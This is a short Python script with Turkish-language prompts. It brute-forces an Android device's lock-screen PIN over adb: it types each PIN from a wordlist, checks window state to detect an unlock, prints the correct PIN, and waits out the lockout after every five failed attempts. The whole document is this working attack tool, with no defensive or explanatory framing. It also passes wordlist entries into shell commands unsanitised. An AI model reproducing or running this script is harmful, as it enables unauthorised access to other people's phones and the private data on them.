import subprocess
from time import sleep


subprocess.Popen("adb devices", shell=True)

sleep(0.5)

adb_id = input("id gir: ")
pin_list = input("liste adı: ")


deneme = 0
subprocess.Popen("adb -s {} shell input keyevent KEYCODE_POWER".format(adb_id),shell=True)
sleep(0.5)
subprocess.Popen("adb -s {} shell input swipe 500 1000 500 500 500".format(adb_id),shell=True)
sleep(0.5)

with open(pin_list,"r",encoding='UTF-8') as pin:
    lines = pin.readlines()
    liste = str([line.strip() for line in lines])
    liste = liste.strip("[")
    liste = liste.strip("]")
    liste = liste.strip("'")

list = liste.split(",")
    


for i in list:
    deneme+=1
    sleep(3)
    subprocess.Popen("adb -s {} shell input text {}".format(adb_id,i),shell=True)
    sleep(2)
    subprocess.Popen("adb -s {} shell input keyevent KEYCODE_ENTER".format(adb_id),shell=True)
    sleep(1)
    output = subprocess.check_output(["adb", "-s", adb_id, "shell", "dumpsys", "window"]).decode('utf-8')
    if "mDreamingLockscreen=false" in output:
        print("doğru pin: {}".format(i))
        break


    else:
        sleep(1)
        print("({})pin uyuşmadı!".format(i))
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_DEL".format(adb_id),shell=True)
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_DEL".format(adb_id),shell=True)
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_DEL".format(adb_id),shell=True)
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_DEL".format(adb_id),shell=True)
    
    if deneme == 5:
        deneme = 0
        sleep(0.2)
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_ENTER".format(adb_id),shell=True)
        sleep(25)
        subprocess.Popen("adb -s {} shell input keyevent KEYCODE_POWER".format(adb_id),shell=True)
        sleep(0.5)
        subprocess.Popen("adb -s {} shell input swipe 500 1000 500 500 500".format(adb_id),shell=True)
        sleep(5)
    else:
        pass
